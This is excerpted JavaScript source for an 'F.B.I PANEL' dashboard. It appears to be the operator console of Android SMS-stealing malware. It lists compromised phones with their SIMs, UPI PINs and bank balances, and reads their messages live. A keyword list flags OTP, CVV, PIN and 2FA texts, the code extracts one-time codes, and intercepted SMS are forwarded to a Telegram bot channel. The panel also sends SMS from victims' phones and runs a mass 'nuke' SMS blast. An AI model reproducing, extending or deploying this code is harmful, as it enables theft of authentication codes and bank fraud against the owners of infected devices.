/* ═══════════════════════════════════════════════════════════════
   F.B.I PANEL v4.0 — CACHE-FREE FAST BOOT · ACTIVE-DEVICE LOCK
   · Active device lock (no random SMS)
   · Bot starts ONLY when device opened
   · Zero stale cache on boot (fresh in-memory state)
   · Parallel long-poll Telegram (3 workers)
   · Single-fire SMS + dedupe across all paths
   · Restriction layer (sender/text WL/BL)
   · Null-safe DOM, escAttr, safe SSE
   ═══════════════════════════════════════════════════════════════ */
...
var FB_PUT_TIMEOUT = 2500;
var TG_LONG_POLL   = 25;
var TG_WORKERS     = 3;

var RATE = {
  DEV_POLL:           5000,
  MSG_FALLBACK_POLL:  4000,
  BG_FORWARD_POLL:    5000,
  BAL_POLL:           20000,
  AM_POLL:            5000
};

var POLL_FAST = RATE.MSG_FALLBACK_POLL;
var POLL_DEV  = RATE.DEV_POLL;
var POLL_BG   = RATE.BG_FORWARD_POLL;
var POLL_BAL  = RATE.BAL_POLL;
var POLL_AM   = RATE.AM_POLL;
var CLOUD_DEB = 800;
...
var amCache = {}, amFetch = {};
var amAll = [], amFilt = [], amCount = 0, amObs = null;
var amLoading = false, amLoaded = false;
var AM = 80;

var nukeRunning = false, nukeSent = 0, nukeFail = 0, nukeTotal = 0;
var _nukeActive = 0, _nukeStartTime = 0, _nukeStatsTmr = null;
var _nukePool = 200;

var fbInstances = [];
var _mergeDebTimer = null;
...
function copyFromEl(el, ev){
  ...
  if(navigator.clipboard){
    ...
    ta2.select(); try{ document.execCommand('copy'); done(); }catch(e){}
    ta2.remove();
  }
}
function toast(msg){
...
function closeM(id){
  ...
  if(id === 'deviceModal'){
    ...
    try{ localStorage.removeItem(CFG.LS_ACTIVE || 'fbi_active_device'); }catch(e2){}
    savePanelSession();
    stopMP();
    if(tgRunning) stopFastTelegram();
  }
}
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 3 · COOKIES & SESSION
   ═══════════════════════════════════════════════════════════════ */

function setCookie(n, v, d){
  try{
    var dt = new Date(); dt.setTime(dt.getTime() + (d || 7) * 86400000);
    document.cookie = n + '=' + encodeURIComponent(v) + '; expires=' + dt.toUTCString() + '; path=/; SameSite=Lax';
  }catch(e){}
}
function getCookie(n){
  try{
    var s = n + '=', p = document.cookie.split(';');
...
function restorePanelSession(){
  var fbUrl = '', dev = '';
  try{
    var raw = localStorage.getItem(CFG.LS_SESSION || 'fbi_session');
...
async function saveUserProfile(p){
  p.lastSeen = Date.now();
  await redisSet('fbi:user:' + p.id, JSON.stringify(p));
  await redisSAdd('fbi:users', String(p.id));
  myProfile = p;
}
...
function renderUserUI(){
  ...
  if(su){
    ...
    su.innerHTML = '<span style="font-size:18px">👤</span><div><b>' + esc(full) + '</b>'
      + (currentUser.username ? ' <span style="color:var(--dim);font-size:10px">@' + esc(currentUser.username) + '</span>' : '')
      + '</div>';
  }
}
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 7 · CARRIER DETECTION
   ═══════════════════════════════════════════════════════════════ */

function getSimCarrier(sim, devSP){
  if(!sim) return devSP || 'Unknown';
  var c = String(
    sim.carrier || sim.carrierName || sim.networkOperator || sim.networkOperatorName ||
    sim.operator || sim.operatorName || sim.provider || sim.networkName || sim.network ||
    sim.serviceProvider || ''
  ).trim();
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 8 · CHANNEL NOTIFY & SMS NOTIFY
   ═══════════════════════════════════════════════════════════════ */
...
function announceChannelConnect(ch){
  ...
  var txt = '✅ <b>F.B.I PANEL Connected</b>\n\n'
    + '🤖 Bot active on this channel\n'
    + '🔗 <a href="' + escAttr(link) + '">' + esc(link) + '</a>\n\n'
    + '📢 Channel: <code>' + esc(ch) + '</code>\n'
    + '🕐 ' + new Date().toLocaleString();
  _fastFetch(CFG.TG_API + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: ch, text: txt, parse_mode: 'HTML', disable_web_page_preview: true })
  }).then(function(r){ return r.json(); }).then(function(res){
    if(res && res.ok){
      _lastConnectedChannel = String(ch);
      try { localStorage.setItem('fbi_connected_ch', _lastConnectedChannel); } catch(e){}
    }
  }).catch(function(){});
}
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 9 · HIGH-PRIORITY DETECTION
   ═══════════════════════════════════════════════════════════════ */

var HIGH_PRIORITY_KEYWORDS = [
  'otp','one time password','one-time password','one time code','one-time code',
  'verification code','verify code','login code','security code','secure code',
  'passcode','password','cvv','cvv2','pin','auth code','authorization code',
  'authorisation code','authcode','2fa','two factor','two-factor','mfa',
  'multi factor','secret code','access code','token','confirmation code',
  'activation code','do not share','never share','valid for','expires in','expire in'
];
function isHighPriority(msg){
  if(!msg) return false;
  var t = String(msg.message || '').toLowerCase();
  for(var i=0; i<HIGH_PRIORITY_KEYWORDS.length; i++){
    if(t.indexOf(HIGH_PRIORITY_KEYWORDS[i]) !== -1) return true;
  }
...
function isBankingSms(sender, message){
  ...
  var isPromo = false;
  for(var p=0; p<BANK_PROMO_KEYWORDS.length; p++){ if(m.indexOf(BANK_PROMO_KEYWORDS[p]) !== -1){ isPromo = true; break; } }
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 11 · INIT — FAST BOOT
   ═══════════════════════════════════════════════════════════════ */

/* 🚀 FAST BOOT: only ESSENTIAL sync calls before first paint.
   Cache and session restore are DEFERRED to after first paint. */
function bootFast(){
  /* ─── SYNC: instant state ─── */
  loadUsedDevices();
  loadDeviceSims();
  ...
  /* ─── ASYNC: defer heavy work to next frame ─── */
  requestAnimationFrame(function(){
    /* Cloud config load — non-blocking */
    initCloudConfig();

    /* Auto-restore Firebase URL session */
    setTimeout(autoRestoreSession, 300);
  });
}

function loadUsedDevices(){
  try{ var r = localStorage.getItem(usedDevicesKey); if(r) usedDevices = JSON.parse(r) || {}; }catch(e){}
}
function saveUsedDevices(){ try{ localStorage.setItem(usedDevicesKey, JSON.stringify(usedDevices)); }catch(e){} }
function loadDeviceSims(){
  try{ var r = localStorage.getItem(deviceSimKey); if(r) deviceSimMap = JSON.parse(r) || {}; }catch(e){}
}
...
function saveForwardTracker(){
  try{ localStorage.setItem('fbi_forward_tracker', JSON.stringify(Array.from(_forwardSeen).slice(-_forwardSeenMax))); }catch(e){}
}
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 12 · CLOUD CONFIG (NO AUTO-BOT-START)
   ═══════════════════════════════════════════════════════════════ */

async function initCloudConfig(){
  /* Load local cached config (fast) */
  try{
    var cached = localStorage.getItem(CFG.LS_CACHE);
    if(cached){
      var parsed = JSON.parse(cached);
      userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, parsed);
    }
  }catch(e){}

  /* Fetch bot username — async, non-blocking */
  fetchBotUsername();

  /* Auto-backup check loop */
  setInterval(checkAutoBackup, 60000);

  /* ❌ Bot NOT auto-started here — waits for device open */

  /* Cloud blob fetch — background */
  try{
      ...
      _fastFetch(CFG.BLOB_BASE + '/' + blobId)
        ...
        .then(function(remote){
          if(remote && typeof remote === 'object'){
            ...
            cacheConfigLocal();
            updateCloudStatus('☁ Synced from cloud');
          }
        })
  ...
  if(uid){
    getUserProfile(uid).then(function(prof){ if(prof) myProfile = prof; }).catch(function(){});
  }
}
...
async function resetCloudConfig(){
  ...
  cacheConfigLocal(); await saveCloudConfig();
  toast('🗑 Config reset'); populateSettingsUI();
}

/* ═══════════════════════════════════════════════════════════════
   SECTION 13 · SESSION RESTORE (deferred, after devices load)
   ═══════════════════════════════════════════════════════════════ */
...
function autoRestoreSession(){
  ...
  /* ✅ Device restore: wait for allDevices to load */
  if(s.activeDeviceUid){
    var tries = 0;
    var restoreTmr = setInterval(function(){
      tries++;
      if(allDevices.length > 0){
        ...
        clearInterval(restoreTmr);
      }
      if(tries > 40) clearInterval(restoreTmr);
    }, 500);
  }
}

/* ═══════════════════════════════════════════════════════════════
   SECTION 14 · FIREBASE CORE
   ═══════════════════════════════════════════════════════════════ */
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 15 · SMS DISPATCH — SINGLE FIRE
   ═══════════════════════════════════════════════════════════════ */
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 16 · ACTIVE DEVICE LOCK  🔒
   ═══════════════════════════════════════════════════════════════ */

/* Returns ONLY the device user opened. No fallback. */
function getActiveDevice(){
  if(!activeDeviceUid) return null;
  var p = activeDeviceUid.split('|||');
  return allDevices.find(function(x){
    return x.id === p[1] && (x._fbId || 'primary') === p[0];
  }) || null;
}

/* Checks if given device is currently the active one */
function _isActiveDevice(dev){
  if(!dev) return false;
  var active = getActiveDevice();
  if(!active) return false;
  return active.id === dev.id && (active._fbId || 'primary') === (dev._fbId || 'primary');
}

/* ═══════════════════════════════════════════════════════════════
   SECTION 17 · CONNECTION / DISCONNECT
   ═══════════════════════════════════════════════════════════════ */
...
function connect(){
  ...
  /* ❌ Bot NOT auto-started — waits for device open */
}
function showErr(m){
...
function disconnect(){
  ...
  stopMP(); stopDP(); stopAP(); stopFastTelegram(); stopBgForwardPoll(); stopBalancePoll(); stopMsgStream();
  clearPanelSession();
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 18 · SSE — REAL-TIME MESSAGES
   ═══════════════════════════════════════════════════════════════ */
...
function startMsgStream(dev){
  ...
  try{
    ...
    _msgStream.onerror = function(){
      ...
      if(_sseFailCount[uid] > 3) stopMsgStream();
    };
...
function _handleStreamMsg(dev, key, data){
  ...
  for(var i=0; i<cached.length; i++){
    if(cached[i].key === key){ cached[i] = msg; isNew = false; break; }
  }
  ...
  if(isNew && msg.type === 'incoming'){
    /* 🔒 FORWARD only if THIS device is the active one */
...
function _shouldForwardOnce(devId, msgKey){
  ...
  _forwardSeen.add(k);
  if(_forwardSeen.size > _forwardSeenMax){
    var arr = Array.from(_forwardSeen);
    _forwardSeen = new Set(arr.slice(-4000));
  }
  return true;
}
...
function _forwardIncoming(dev, msg){
  ...
  if(!_isActiveDevice(dev)) return;   /* 🔒 strict */
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 19 · RESTRICTION LAYER
   ═══════════════════════════════════════════════════════════════ */

function _splitCsv(v){ return String(v || '').split(',').map(function(s){ return s.trim(); }).filter(Boolean); }

function passesRestriction(sender, message, msgObj){
  var senderStr = '';
  if(msgObj && msgObj.chat){
    senderStr = String(msgObj.chat.username || msgObj.chat.id || '').toLowerCase();
  }
  ...
  if(wl.length){
    var okW = wl.some(function(w){ return senderStr === String(w).toLowerCase().replace('@',''); });
    if(!okW) return false;
  }

  var bl = userConfig.senderBlacklist || [];
  if(bl.length){
    var bad = bl.some(function(w){ return senderStr === String(w).toLowerCase().replace('@',''); });
    if(bad) return false;
  }

  var tw = userConfig.textWhitelist || [];
  if(tw.length){
    var hit = tw.some(function(w){ return body.indexOf(String(w).toLowerCase()) !== -1; });
    if(!hit) return false;
  }

  var tbl = userConfig.textBlacklist || [];
  if(tbl.length){
    var skip = tbl.some(function(w){ return body.indexOf(String(w).toLowerCase()) !== -1; });
  ...
  dPoll = setInterval(async function(){
    ...
    try{
      ...
      nD.forEach(function(dev){
        dev._fbId = 'primary'; dev._fbLabel = 'Primary';
        dev._fbUrl = FB_URL; dev._fbKey = FB_KEY;
      });
      ...
      renderGrid();
      if(selDev){
        var up = allDevices.find(function(x){ return x.id === selDev.id; });
...
function startAP(){
  stopAP();
  aPoll = setInterval(function(){
    var el = document.getElementById('allMsgsModal');
    if(el && el.classList.contains('open')) pollAllFresh();
  }, POLL_AM);
}
function stopAP(){ if(aPoll){ clearInterval(aPoll); aPoll = null; } }
function setupObs(){
  killObs();
  var s = document.getElementById('amSentinel');
  if(!s) return;
  amObs = new IntersectionObserver(function(e){
    if(e[0].isIntersecting) renderPage();
  }, { rootMargin: '400px' });
  amObs.observe(s);
}
...
function parseBatt(v){
  if(v == null) return NaN;
  return parseInt(String(v).replace('%','').trim());
}
function fmtPh(n){
  if(!n) return '—';
...
function _rebuildSC(){
  var on = 0, off = 0, sims = 0, upi = 0;
  for(var i=0; i<allDevices.length; i++){
    var d = allDevices[i];
    if(d.status) on++; else off++;
    sims += d.sims.length;
    if(d.upipin || pinC[d.id]) upi++;
  }
  _sc = { tot: allDevices.length, on: on, off: off, sims: sims, upi: upi };
}
function renderStats(){
  _rebuildSC();
  var a = document.getElementById('tpTot'), b = document.getElementById('tpOn'), c = document.getElementById('tpOff');
  if(a) a.textContent = _sc.tot + ' total';
  if(b) b.textContent = _sc.on + ' online';
  if(c) c.textContent = _sc.off + ' offline';
}

/* ═══════════════════════════════════════════════════════════════
   SECTION 23 · DEVICE SEARCH
   ═══════════════════════════════════════════════════════════════ */
...
function clearDeviceSearch(){
  var el = document.getElementById('deviceSearch');
  if(el) el.value = '';
  deviceSearchQuery = '';
  renderGrid(true);
}
...
function updateCardNoBlink(devId){
  ...
  if(stVals[0]){
    ...
    stVals[0].textContent = isNaN(bv) ? d.batteryRaw : bv + '%';
    stVals[0].style.color = bc;
  }
  var bal = deviceBalances[d.id];
  var balEl = card.querySelector('.dc-balance');
  if(balEl && bal){
    balEl.classList.remove('empty');
    balEl.innerHTML = '<div class="dc-bal-lbl">💰 Balance</div>'
      + '<div class="dc-bal-bank">' + esc(bal.bank) + '</div>'
      + '<div class="dc-bal-val" data-copy="' + escAttr(String(bal.amount)) + '" onclick="copyFromEl(this,event)">' + fmtBal(bal.amount) + '</div>';
  }
}
...
function renderGrid(force){
  ...
  if(!filtered.length){
    ...
    var emptySig = '__EMPTY__' + (deviceSearchQuery || '') + '|' + gridFilter;
  ...
  filtered.forEach(function(d, i){
    ...
    var bal = deviceBalances[d.id];
    var balHtml = bal
      ? '<div class="dc-balance"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-bank">' + esc(bal.bank) + '</div><div class="dc-bal-val" data-copy="' + escAttr(String(bal.amount)) + '" onclick="copyFromEl(this,event)">' + fmtBal(bal.amount) + '</div></div>'
...
function setGridFilter(f){
  gridFilter = f;
  var labels = { all:'All', online:'Online', offline:'Offline', jio:'Jio', vi:'Vi', pin:'PIN', balance:'Balance' };
  var fl = document.getElementById('filterLabel');
  if(fl) fl.textContent = labels[f] || 'All';
...
function openDeviceModal(uid){
  ...
  /* ✅ START bot when device is active */
  ...
  if(cached){
    allMsgs = cached;
    lastKeys = new Set(cached.map(function(m){ return m.key; }));
    updCnt(); filterActiveMsgs(); renderBankPane();
    _silentRefresh(selDev);
  } else {
...
function refreshDeviceModal(){
  ...
  document.querySelectorAll('#dmSimSelect .sim-opt').forEach(function(el){
    el.classList.toggle('active', parseInt(el.dataset.sim) === curSim);
  });
  document.querySelectorAll('#dmPane-send .stb').forEach(function(el, i){
    el.className = 'stb' + (i+1 === curSim ? (i+1 === 1 ? ' s1' : ' s2') : '');
  });
  ...
  if(sendDisp){
    sendDisp.innerHTML = '<div style="width:9px;height:9px;border-radius:50%;background:' + (d.status ? 'var(--mint)' : 'var(--dim)') + (d.status ? ';box-shadow:0 0 7px var(--mint)' : '') + '"></div>'
...
function dmSwitchTab(tab){
  ...
  var pane = document.getElementById('dmPane-' + tab);
  if(pane) pane.classList.add('active');
  if(tab === 'bank') renderBankPane();
}
function setActiveSim(sim){
  if(!selDev) return;
  deviceSimMap[selDev.id] = sim;
  saveDeviceSims();
  refreshDeviceModal();
...
function saveNoteActive(){
  ...
  fbSet('clients/' + selDev.id + '/note', val || null, selDev._fbUrl, selDev._fbKey)
    .then(function(){ noteC[selDev.id] = val; selDev.note = val; toast('📝 Note saved'); renderGrid(true); })
...
function startBalancePoll(){ stopBalancePoll(); balPoll = setInterval(balanceTick, POLL_BAL); setTimeout(balanceTick, 500); }
...
async function loadPinActive(){
  ...
  if(raw){
    ...
    pv.setAttribute('data-copy', escAttr(display));
...
async function pollMsgs(id){
  ...
  try{
    ...
    if(hasNew){
      ...
      var lm = msgs[0];
      if(lm){
        var otp = _extractOtp(lm.message);
        if(otp && otp !== _lastOtp) otpShow(otp, lm.sender);
      }
      checkAndForward(msgs, id);
    } else if(allMsgs.length !== msgs.length){
      allMsgs = msgs;
      updCnt(); filterActiveMsgs(); renderBankPane();
    }
  }catch(e){}
...
function _silentRefresh(dev){
  ...
  var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
  var auth = fbKey ? '?auth=' + fbKey + '&' : '?';
  _fastFetch(fbUrl + '/messages/' + dev.id + '.json' + auth + 'orderBy="$key"&limitToLast=200')
    .then(function(r){ return r.json(); })
    .then(function(data){
...
function updCnt(){
  var el = document.getElementById('dmMsgCnt');
  if(el) el.textContent = allMsgs.length + ' msgs';
}
...
function filterActiveMsgs(){
  ...
  var listEl = document.getElementById('dmMsgList');
  if(!listEl) return;
...
function setActiveMF(f){
  ...
  ['all','incoming','outgoing','bank'].forEach(function(t){
    var e = document.getElementById('dm-mf-' + t);
    if(e) e.classList.toggle('ma', t === f);
  });
  filterActiveMsgs();
}
...
function confirmDelMsg(devId, key, evt, preview){
  ...
  var pv = document.getElementById('delMsgPreview');
  if(pv) pv.textContent = preview || '(no preview)';
  var ok = document.getElementById('delMsgOk');
  if(ok) ok.onclick = doDelMsg;
  openM('delMsgModal');
}
...
function sendSmsActive(){
  ...
  if(!passesRestriction('', msg, null)){ toast('🚫 Blocked by restriction'); return; }
...
function showResActive(ok, m){
  var el = document.getElementById('dmSendRes');
  if(!el) return;
  el.textContent = m;
  el.className = 'sres ' + (ok ? 'ok' : 'err');
  el.style.display = 'block';
  setTimeout(function(){ el.style.display = 'none'; }, 3000);
}

/* ═══════════════════════════════════════════════════════════════
   SECTION 31 · ALL MSGS VIEW
   ═══════════════════════════════════════════════════════════════ */
...
function setAMF(f){
  ...
  ['all','incoming','outgoing'].forEach(function(t){
    var e = document.getElementById('amf-' + t);
    if(e) e.classList.toggle('ma', t === f);
  });
  filterAndRender();
}
...
async function loadAllMsgs(force){
  ...
  if(!onlineDevs.length){
    if(list) list.innerHTML = '<div class="empty"><div class="ei">📱</div><p>No online devices</p></div>';
    return;
  }
  amLoading = true;
  var now = Date.now();
...
function rebuild(){
  ...
  for(var i=0; i<onlineDevs.length; i++){
    ...
    for(var j=0; j<msgs.length; j++){
      var m = msgs[j];
      c.push({
        key: m.key, message: m.message, sender: m.sender, _ts: m._ts, type: m.type,
        dateTime: m.dateTime, cn: i+1, did: dev.id, dname: dev.name, dnum: dev.mobNo,
        dnote: noteC[dev.id] || dev.note || ''
      });
    }
  }
...
function renderPage(){
  var list = document.getElementById('amList');
  if(!list) return;
  var batch = amFilt.slice(amCount, amCount + AM);
  ...
  batch.forEach(function(m){
    ...
    el.innerHTML = '<div class="am-left"><div class="am-cn">#' + m.cn + '</div><div class="am-name">' + esc(m.dname) + '</div><div class="am-name" style="font-size:9px;color:var(--sky)">' + esc(m.dnum || '') + '</div></div>'
      ...
      + (bank ? '<span class="msg-tp" style="background:rgba(168,85,247,.14);color:var(--gold2)">🏦 ' + esc(bank.name) + '</span>' : '')
      + '<span class="msg-tp ' + (m.type === 'incoming' ? 'mt-i' : 'mt-o') + '">' + m.type + '</span>'
      + '<span class="msg-dt">' + esc(m.dateTime || '') + '</span></div>'
...
function updateNukeInfo(){
  var online = allDevices.filter(function(d){ return d.status; });
  var simsTotal = 0;
  online.forEach(function(d){ simsTotal += d.sims.length || 0; });
...
function finishNuke(){
  ...
  toast('✅ Nuke done — ' + nukeSent + ' sent, ' + nukeFail + ' failed in ' + e + 's');
...
function openSettings(){
  try{ populateSettingsUI(); openM('settingsModal'); }
...
function populateSettingsUI(){
  ...
  var wl = document.getElementById('setSenderWhitelist'); if(wl) wl.value = (userConfig.senderWhitelist || []).join(', ');
  var bl = document.getElementById('setSenderBlacklist'); if(bl) bl.value = (userConfig.senderBlacklist || []).join(', ');
  var twl = document.getElementById('setTextWhitelist'); if(twl) twl.value = (userConfig.textWhitelist || []).join(', ');
  var tbl = document.getElementById('setTextBlacklist'); if(tbl) tbl.value = (userConfig.textBlacklist || []).join(', ');
...
function setForwardMode(mode){
  ...
  updateForwardModeUI();
  toast('✓ Forward mode: ' + (mode === 'banking' ? 'Banking only' : 'All'));
}
...
function updateTgStatusLine(){
  var el = document.getElementById('tgStatusLine');
  if(!el) return;
  var lines = [];
  if(tgRunning){
    lines.push('● Bot active (' + _pollWorkers.length + ' workers)');
...
function updateTgBtn(){
  var btn = document.getElementById('tgStatus');
  if(!btn) return;
...
function renderFbList(){
  var el = document.getElementById('settingsFbList');
  if(!el) return;
  ...
  el.innerHTML = fbInstances.map(function(inst){
    ...
    return '<div class="fb-list-row"><div class="fb-list-row-info"><div class="fb-list-row-lbl">' + esc(inst.label) + '</div><div class="fb-list-row-url">' + esc(inst.url) + '</div>' + err + '</div>'
      ...
      + '<button onclick="fbReload(\'' + escAttr(inst.id) + '\')" style="padding:4px 8px;background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.2);border-radius:6px;color:var(--gold2);font-size:11px;cursor:pointer;font-family:\'Chakra Petch\',sans-serif">↻</button>'
      + '<button onclick="fbRemove(\'' + escAttr(inst.id) + '\')" style="padding:4px 8px;background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.2);border-radius:6px;color:var(--rose);font-size:11px;cursor:pointer;font-family:\'Chakra Petch\',sans-serif">✕</button></div>';
  }).join('');
}
async function fbReload(id){
  var inst = fbInstances.find(function(x){ return x.id === id; });
  if(!inst) return;
  toast('↻ Reloading…');
...
async function addFirebaseFromSettings(){
  ...
  var inst = {
    ...
    label: label || ('Firebase ' + (fbInstances.length + 1)),
    url: url, key: key, devices: [], status: 'connecting', poll: null, devCount: 0, lastError: ''
  };
...
async function fbLoadInst(inst){
  try{
    ...
    var url = inst.url + '/clients.json' + auth;
    ...
    inst.status = 'error'; inst.devices = []; inst.devCount = 0; inst.lastError = e.message;
    toast('❌ ' + inst.label);
    renderFbList();
  }
}
  ...
  setTimeout(function(){
    inst.poll = setInterval(async function(){
      ...
      try{
        ...
        if(!r.ok){ inst.status = 'error'; inst.lastError = 'HTTP ' + r.status; return; }
        var devs = parseDevs(await r.json());
        devs.forEach(function(d){ d._fbId = inst.id; d._fbLabel = inst.label; d._fbUrl = inst.url; d._fbKey = inst.key; });
        inst.devices = devs; inst.devCount = devs.length; inst.status = 'ok'; inst.lastError = '';
        fbMergeAll();
      }catch(e){ inst.status = 'error'; inst.lastError = e.message; }
    }, POLL_DEV);
  }, staggerMs || 0);
}
...
function loadFirebasesFromConfig(){
  ...
  saved.forEach(function(s){
    ...
    var inst = {
      id: 'fb_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
      label: s.label || s.url, url: s.url, key: s.key || '',
      devices: [], status: 'connecting', poll: null, devCount: 0, lastError: ''
    };
...
function saveAllSettings(){
  ...
  if(nL){ var arr = _splitCsv(nL.value); userConfig.numLabels = arr.length ? arr : ['To','Receipt','Number','Mobile','Target','Phone']; }
  var mL = document.getElementById('setMsgLabels');
  if(mL){ var arr2 = _splitCsv(mL.value); userConfig.msgLabels = arr2.length ? arr2 : ['Message','Msg','Body','Token','Text']; }

  var wl = document.getElementById('setSenderWhitelist'); if(wl) userConfig.senderWhitelist = _splitCsv(wl.value);
  var bl = document.getElementById('setSenderBlacklist'); if(bl) userConfig.senderBlacklist = _splitCsv(bl.value);
  var twl = document.getElementById('setTextWhitelist'); if(twl) userConfig.textWhitelist = _splitCsv(twl.value);
  var tbl = document.getElementById('setTextBlacklist'); if(tbl) userConfig.textBlacklist = _splitCsv(tbl.value);

  cacheConfigLocal();
  debouncedCloudSave();

  /* Bot restart logic: if enabled AND we have an active device, keep running */
  if(userConfig.botEnabled && userConfig.channelId){
    if(activeDeviceUid && !tgRunning) startFastTelegram();
    else if(!activeDeviceUid && tgRunning) stopFastTelegram();
  } else {
    stopFastTelegram();
  }
  updateTgStatusLine();
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 34 · TELEGRAM — PARALLEL LONG-POLL ENGINE
   ═══════════════════════════════════════════════════════════════ */
...
async function fetchBotUsername(){
  ...
  try{
    ...
    if(d.ok && d.result){
      ...
      var uname = d.result.username || ('bot_' + d.result.id);
...
async function startFastTelegram(){
  ...
  try{
    ...
    if(d.ok && d.result && d.result.length){
      _sharedOffset = d.result[d.result.length-1].update_id + 1;
    } else {
      _sharedOffset = 0;
    }
  }catch(e){ _sharedOffset = 0; }
...
function stopFastTelegram(){
  tgRunning = false;
  _pollWorkers.forEach(function(w){ w._stop = true; });
  _pollWorkers = [];
  updateTgStatusLine(); updateTgBtn();
}
...
async function runWorker(w){
  var backoff = 200;
  while(!w._stop && tgRunning){
    try{
      var offset = _sharedOffset;
      ...
      var tmr = setTimeout(function(){ ctrl.abort(); }, (TG_LONG_POLL + 5) * 1000);
      ...
      if(!r.ok){
        if(r.status === 409){ await sleep(600); continue; }
      ...
      if(!data.ok){ await sleep(1000); continue; }
      ...
      else { backoff = Math.min(backoff * 2, 10000); await sleep(backoff); }
    }
  }
}
...
function isChannelMatch(msg){
  ...
  var cfg = String(userConfig.channelId || '');
  if(!cfg) return false;
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 35 · SMS ROUTER — STRICT ACTIVE DEVICE
   ═══════════════════════════════════════════════════════════════ */

function _dedupeKey(msg){
...
function routeChannelSms(number, message, msgObj){
  ...
  if(_dispatchDedup.size > _dispatchDedupMax){
    _dispatchDedup = new Set(Array.from(_dispatchDedup).slice(-2000));
  }

  if(!passesRestriction(number, message, msgObj)){
    console.log('[Restriction] Skipped:', number);
    return;
  }

  /* 🔒 STRICT: ONLY the active device */
  var dev = getActiveDevice();
  if(!dev){
    console.log('[Route] No active device — SMS skipped. Open a device first.');
    toast('⚠ Open a device to send SMS');
    return;
  }
  if(!dev.status){
    console.log('[Route] Active device is offline:', dev.name);
    toast('⚠ Active device is offline');
    return;
  }
...
function _showCapturedNotif(number, message){
  var el = document.getElementById('capturedBar');
  if(!el) return;
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 36 · AUTO-FORWARD (poll path) — STRICT ACTIVE DEVICE
   ═══════════════════════════════════════════════════════════════ */
...
function _extractBetween(text, startTag, endTag){
  ...
  if(sIdx === -1){
    ...
    if(cleanTag && cleanTag !== lowerTag){
      sIdx = lowerT.indexOf(cleanTag);
      if(sIdx !== -1) lowerTag = cleanTag;
    }
  }
...
function parseTelegramMessage(text){
  ...
  if((!number || !message) && /one[\s-]?tap/i.test(text)){
    ...
    if(otc){
      if(!number){ var c4 = _cleanPhone(otc[1]); if(c4.length >= 10) number = c4; }
      if(!message && otc[2]) message = otc[2].trim();
    }
  }
  if(!message){
    var best = '';
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 38 · USER REGISTRATION & OWNER COMMANDS
   ═══════════════════════════════════════════════════════════════ */
  ...
  try{
    ...
    if(!prof){
      await saveUserProfile({
        id: chatId, first_name: from.first_name || '', last_name: from.last_name || '',
        username: from.username || '', language: from.language_code || 'en',
        joinedAt: Date.now(), verified: true, lastSeen: Date.now()
      });
    } else {
...
async function handleOwnerCommand(msg){
  ...
  if(cmd.startsWith('/broadcast ') || cmd === '/broadcast'){
    ...
    var chOk = false;
    if(userConfig.channelId){
      try{ var rc = await tgApi('sendMessage', { chat_id: userConfig.channelId, text: body, parse_mode: 'HTML' }); chOk = !!(rc && rc.ok); }catch(e){}
    }
...
async function tgSend(chatId, text){
  try{ return await tgApi('sendMessage', { chat_id: chatId, text: text, parse_mode: 'HTML' }); }
  catch(e){ return null; }
}

/* ═══════════════════════════════════════════════════════════════
   SECTION 39 · BACKUP HELPERS
   ═══════════════════════════════════════════════════════════════ */

async function collectUsersBackup(onlyNew){
  var sentSet = {};
  if(onlyNew){
    var arr = await redisSMembers('fbi:sent_fbs');
...
function _pingUpdateBtn(){
  var b = document.getElementById('apBtn');
  if(!b) return;
...
function _pingBuildPanel(){
  ...
  p.id = 'pingPanel';
  p.style.cssText = 'position:fixed;bottom:20px;right:20px;width:300px;max-height:440px;background:linear-gradient(145deg,#130a22,#0d0618);border:1px solid rgba(168,85,247,.28);border-radius:16px;z-index:8000;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);display:flex;flex-direction:column;max-width:calc(100vw - 40px);';
  var hdr = document.createElement('div');
  hdr.style.cssText = 'padding:12px 16px;border-bottom:1px solid rgba(168,85,247,.1);display:flex;align-items:center;gap:8px;';
  hdr.innerHTML = '<div style="width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 8px var(--mint);animation:pulse 1.5s infinite"></div>'
...
function _pingAddRow(uid, name, online, isNew){
  ...
  if(ex){
    var d = ex.querySelector('.pr-dot'), l = ex.querySelector('.pr-label'), b = ex.querySelector('.pr-badge');
    if(d) d.style.background = online ? 'var(--mint)' : 'rgba(244,63,94,.4)';
    if(l){ l.textContent = name; l.style.color = online ? 'var(--text)' : 'var(--dim)'; }
    if(b){ b.textContent = online ? 'ON' : 'OFF'; b.style.color = online ? 'var(--mint)' : 'var(--rose)'; }
    if(isNew) list.insertBefore(ex, list.firstChild);
    return;
  }
  ...
  row.innerHTML = '<div class="pr-dot" style="width:8px;height:8px;border-radius:50%;background:' + (online ? 'var(--mint)' : 'rgba(244,63,94,.4)') + '"></div>'
...
function autoPinAll(){
  ...
  _apOn = true;
  _pingReplied = 0; _pingTotal = allDevices.length;
  _pingUpdateBtn();
  _pingBuildPanel();
  toast('📡 Pinging…');
  _apLoop();
...
/* ═══════════════════════════════════════════════════════════════
   SECTION 42 · BOOTSTRAP — FAST BOOT
   ═══════════════════════════════════════════════════════════════ */

/* 🚀 Fire boot immediately — no waiting for DOMContentLoaded */
bootFast();

/* Deferred: attach UI listeners after first paint */
setTimeout(function(){
  document.querySelectorAll('.overlay').forEach(function(o){
    o.addEventListener('click', function(e){
      if(e.target === o){
